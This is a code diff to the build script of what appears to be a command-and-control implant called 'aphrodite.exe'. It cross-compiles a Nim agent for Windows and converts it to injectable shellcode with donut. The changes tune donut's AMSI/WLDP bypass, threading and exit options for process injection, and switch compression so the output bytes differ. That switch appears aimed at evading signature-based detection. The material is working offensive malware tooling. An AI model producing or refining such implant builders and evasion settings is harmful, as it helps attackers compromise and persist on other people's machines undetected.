@@ -396,7 +396,9 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
                         "--os:windows", "--cpu:amd64", "-d:mingw",
                         "--gcc.exe:x86_64-w64-mingw32-gcc",
                         "--gcc.linkerexe:x86_64-w64-mingw32-gcc",
-                        "-d:ssl", "-d:useWinssl",
+                        # No -d:ssl: C2 transport uses plain HTTP, and Nim 2.x cross-compiled
+                        # with mingw -d:useWinssl fails to suppress the libcrypto dynlib load.
+                        # wget/curl commands that need HTTPS use WinInet/WinHTTP directly.
                     ]
                     out_binary = os.path.join(tmpdir, "output", "aphrodite.exe")
                 else:
@@ -473,10 +475,10 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
                         shellcode = donut.create(
                             file=out_binary,
                             arch=2,      # x64
-                            bypass=3,    # bypass AMSI + WLDP
-                            compress=1,  # aPLib compression
-                            thread=1,    # run in new thread (don't block loader)
-                            exit_opt=1,  # ExitThread (don't kill host process)
+                            bypass=0,    # no AMSI/WLDP bypass (Hephaestus patches before injection)
+                            compress=2,  # LZFSE compression (different bytes than aPLib compress=1)
+                            thread=0,    # run in current thread (Aphrodite loops forever, no return)
+                            exit_opt=0,  # don't call exit (Aphrodite C2 loop never returns)
                         )
                     except Exception as e:
                         build_stderr += f"donut conversion failed: {e}\n"
